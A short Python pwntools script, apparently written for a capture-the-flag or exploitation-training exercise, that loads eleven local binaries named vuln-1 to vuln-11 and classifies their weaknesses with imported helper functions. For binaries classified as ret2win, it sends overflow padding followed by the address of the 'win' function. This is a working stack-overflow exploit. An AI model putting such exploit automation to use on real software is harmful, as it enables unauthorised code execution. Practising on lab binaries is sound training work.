from pwn import *
from Identify import *
binaries = [['   Name','SOF','Win','Sys','Bin','scall','Execve','Pwn']]
#binary = ['isSOF', 'isWin', 'isSystem', 'isBinSh', 'syscall', 'isExecve', 'isPwnme']
		
	
for i in range(1,12):

	e = ELF('./vuln-%d' % i)
	r = ROP(e)
	


	curBinary = Identify(e,r,i)
	string = AttackVector(curBinary)
	curBinary.append(string)
	binaries.append(curBinary)

	if("Ret2Win" == string):
		pad = getPadding(i)
		padding = b'A' * int(pad)
		p = process('./vuln-%d' % i)

		win = e.sym['win']
		
		p.sendline(padding+p64(win))

	



for i in binaries:
	print(i)
